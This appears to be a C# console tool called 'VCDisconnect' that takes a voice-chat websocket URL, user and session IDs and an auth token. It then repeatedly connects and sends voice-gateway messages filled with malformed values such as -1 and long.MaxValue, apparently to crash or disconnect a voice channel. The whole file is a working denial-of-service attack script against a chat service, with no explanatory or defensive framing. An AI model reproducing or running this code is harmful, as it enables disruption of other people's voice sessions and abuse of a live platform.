using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net.WebSockets;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Sockets;

namespace VCDisconnect
{
    internal class Program
    {

        static async Task Main(string[] args)
        { 
            Console.Write("[CONSOLE] Websocket: ");
            string wsServer = Console.ReadLine();
            Console.Write("[CONSOLE] Server ID: ");
            string serverId = Console.ReadLine();
            Console.Write("[CONSOLE] Your User ID: ");
            string myUid = Console.ReadLine(); 
            Console.Write("[CONSOLE] Session ID: ");
            string sessionId = Console.ReadLine();
            Console.Write("[CONSOLE] Token: ");
            string token = Console.ReadLine();
            while (true)
            {

                using (var ws = new ClientWebSocket())
                {
                    await ws.ConnectAsync(new Uri(wsServer), CancellationToken.None);

                    var data = new
                    {
                        op = 0,
                        d = new
                        {
                            server_id = serverId,
                            user_id = myUid,
                            session_id = sessionId,
                            token,
                            video = true,
                            streams = new object[]
                            {
                            new
                            {
                                type = "video",
                                rid = "100",
                                quality = -1
                            },
                            new
                            {
                                type = "video",
                                rid = "50",
                                quality = long.MaxValue
                            }
                            }
                        }
                    };
                    var message = Newtonsoft.Json.JsonConvert.SerializeObject(data);
                    await ws.SendAsync(new ArraySegment<byte>(Encoding.UTF8.GetBytes(message)), WebSocketMessageType.Text, true, CancellationToken.None);

                    var data2 = new
                    {
                        op = 12,
                        d = new
                        {
                            audio_ssrc = -1,
                            video_ssrc = -1,
                            rtx_ssrc = long.MaxValue,
                            streams = new object[]
                            {
                            new
                            {
                                type = "video",
                                rid = "100",
                                ssrc = -1,
                                active = true,
                                quality = long.MaxValue,
                                rtx_ssrc = long.MaxValue,
                                max_bitrate = long.MaxValue,
                                max_framerate = long.MaxValue,
                                max_resolution = new
                                {
                                    type = "fixed",
                                    width = long.MaxValue,
                                    height = long.MaxValue
                                }
                            }
                            }
                        }
                    };
                    var message2 = Newtonsoft.Json.JsonConvert.SerializeObject(data2);
                    await ws.SendAsync(new ArraySegment<byte>(Encoding.UTF8.GetBytes(message2)), WebSocketMessageType.Text, true, CancellationToken.None);

                    var data3 = new
                    {
                        op = 5,
                        d = new
                        {
                            speaking = long.MaxValue,
                            delay = -1,
                            ssrc = long.MaxValue
                        }
                    };
                    var message3 = Newtonsoft.Json.JsonConvert.SerializeObject(data3);
                    await ws.SendAsync(new ArraySegment<byte>(Encoding.UTF8.GetBytes(message3)), WebSocketMessageType.Text, true, CancellationToken.None);

                    var data4 = new
                    {
                        op = 3,
                        d = -1
                    };
                    var message4 = Newtonsoft.Json.JsonConvert.SerializeObject(data4);
                    await ws.SendAsync(new ArraySegment<byte>(Encoding.UTF8.GetBytes(message4)), WebSocketMessageType.Text, true, CancellationToken.None);

                }
            }
        }
    }
}
